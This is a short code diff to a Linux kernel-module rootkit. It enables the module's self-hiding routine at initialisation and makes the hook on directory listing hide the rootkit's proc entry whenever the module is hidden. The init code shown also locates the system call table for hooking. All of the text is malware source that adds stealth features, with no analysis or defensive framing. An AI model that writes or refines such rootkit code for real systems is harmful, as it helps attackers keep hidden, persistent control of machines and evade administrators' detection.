@@ -112,7 +112,7 @@ static ssize_t rk_proc_write(struct file *file, const char __user *ubuf, size_t 
 static int rk_filldir_t(struct dir_context *ctx, const char *proc_name, int len,
                         loff_t off, u64 ino, unsigned int d_type)
 {
-    if (strncmp(proc_name, PROCFILE_NAME, strlen(PROCFILE_NAME) - 1) == 0)
+    if (module_hidden && (strncmp(proc_name, PROCFILE_NAME, strlen(PROCFILE_NAME) - 1) == 0))
         return 0;
     return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, d_type);
 }
@@ -182,7 +182,7 @@ static int __init lkm_rootkit_init(void)
         return 1;
     }
 
-    // module_hide();
+    module_hide();
 
     syscall_table = find_syscall_table();
     pr_info("Found syscall_table at %lx\n", *syscall_table);
